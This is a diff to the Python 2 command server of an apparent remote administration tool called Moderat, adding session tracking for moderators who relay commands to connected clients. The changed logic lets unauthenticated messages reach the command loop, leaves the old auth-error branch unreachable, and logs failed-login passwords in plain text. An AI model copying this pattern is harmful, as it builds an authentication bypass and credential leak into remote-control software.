@@ -31,6 +31,9 @@ class ModeratServer:
         self.shared_socks = {}
         self.socks = {}
 
+        # sessions bank
+        self.active_sessions = []
+
         # moderators
         self.moderator_threads = {}
 
@@ -173,30 +176,39 @@ class ModeratServer:
         while 1:
             try:
                 client_socket, data = moderator_receive(sock)
-                if data.startswith('auth '):
+                if data == 'initSession':
+                    if client_socket in self.active_sessions:
+                        print '[+] Start Moderators Checker Session ID (%s)' % client_socket
+                        moderator_send(sock, 'sessionSuccess', client_socket)
+                    else:
+                        moderator_send(sock, 'sessionError', client_socket)
+                        continue
+                elif data.startswith('auth '):
+                    print '[+] New Moderator Connection'
                     try:
                         command, username, password = data.split()
                         if ModeratorsManagment().login_user(username, password):
-                            print '[+] Login Success For Moderator (%s)' % username
+                            print '[+] Login Success For Moderator (%s) Session ID (%s)' % (username, client_socket)
+                            self.active_sessions.append(client_socket)
                             moderator_send(sock, 'LoginSuccess', client_socket)
-                            while 1:
-                                try:
-                                    client_socket, data = moderator_receive(sock)
-                                    print data
-                                    if data == 'getClients':
-                                        output = self.command_get_clients()
-                                    else:
-                                        output = self.command_all(data, client_socket)
-                                    moderator_send(sock, output, client_socket)
-                                except socket.error:
-                                    print '[-] Socket Error'
-                                    break
                         else:
                             print '[!] Login Failed With (%s, %s)' % (username, password)
                             moderator_send(sock, 'LoginError', client_socket)
+                            continue
                     except Exception as e:
                         print e
                         continue
+                while 1:
+                    try:
+                        client_socket, data = moderator_receive(sock)
+                        if data == 'getClients':
+                            output = self.command_get_clients()
+                        else:
+                            output = self.command_all(data, client_socket)
+                        moderator_send(sock, output, client_socket)
+                    except socket.error:
+                        print '[-] Socket Error'
+                        break
                 else:
                     moderator_send(sock, 'AuthError', client_socket)
             except socket.error:
